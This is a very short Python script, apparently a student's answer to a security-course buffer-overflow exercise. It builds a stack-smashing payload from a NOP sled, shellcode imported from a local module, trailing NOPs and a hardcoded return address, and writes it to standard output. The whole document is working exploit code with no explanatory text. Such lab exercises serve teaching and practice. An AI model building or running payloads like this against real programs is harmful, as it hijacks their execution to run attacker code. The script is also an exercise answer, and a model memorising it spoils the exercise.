#!/usr/bin/env python3
import sys
from shellcode import shellcode
from struct import pack
# Your code here
shell_len = len(shellcode)
padding_len = (1036 - shell_len-50)
sys.stdout.buffer.write((b"\x90"*padding_len)+shellcode+ (b"\x90"*50) +b"\x85\xb1\xfe\xff")
